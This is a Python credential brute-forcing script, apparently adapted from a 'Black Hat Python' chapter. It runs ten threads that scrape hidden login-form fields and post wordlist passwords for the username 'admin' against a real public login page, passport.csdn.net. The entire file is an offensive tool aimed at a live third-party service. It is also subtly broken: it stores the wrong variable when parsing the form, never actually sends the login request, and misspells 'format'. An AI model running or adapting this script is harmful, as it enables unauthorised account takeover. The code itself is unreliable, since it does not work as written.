# import requests
import urllib.request
import threading
import sys
import queue
import html
# from html import HTMLParser
from html.parser import HTMLParser

# general settings
user_thread = 10
username = "admin"
wordlist_file = "/root/PycharmProjects/BHP3/Chapter5/Blasting_dictionary/常用密码.txt"
resume = None

# target specific settings
target_url = "https://passport.csdn.net/login"
target_post = "https://passport.csdn.net/login"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"


class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = value


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False

        print("Finished setting up for: {}".format(username))

    def run_bruteforce(self):
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().rstrip().decode(encoding = 'utf-8')

            response = urllib.request.urlopen(target_url)

            # page = response.text
            page = response.read()
            # print("Trying: {} : {} ({} left)".format(self.username, brute, self.passwdord_q.qsize()))
            print("Trying: {} : {} ({} left)".format(self.username, brute, self.password_q.qsize()))
            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page.decode(encoding='utf-8'))

            post_tags = parser.tag_results

            # add our username nad password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            # login_response = urllib.request.post(target_post, data=post_tags)
            login_response = urllib.request.Request(target_post, data=post_tags)
            # login_result = login_response.text
            # response_s = urllib.request.urlopen(login_response)
            login_result = login_response.data

            if success_check in login_result:
                self.found = True

                print("[*] Bruteforce successful.")
                print("[*] Username: {}".format(username))
                print("[*] Password: {}".foramt(brute))
                print("[*] Waiting for other threads to exit...")


def build_wordlist(wordlist_file):
    # read in the word list
    fd = open(wordlist_file, "rb")
    raw_words = fd.readlines()
    fd.close()

    found_resume = False
    words = queue.Queue()

    for word in raw_words:
        word = word.rstrip()

        if resume is not None:
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: {}".format(resume))

        else:
            words.put(word)

    return words


words = build_wordlist(wordlist_file)

bruter_obj = Bruter(username, words)
bruter_obj.run_bruteforce()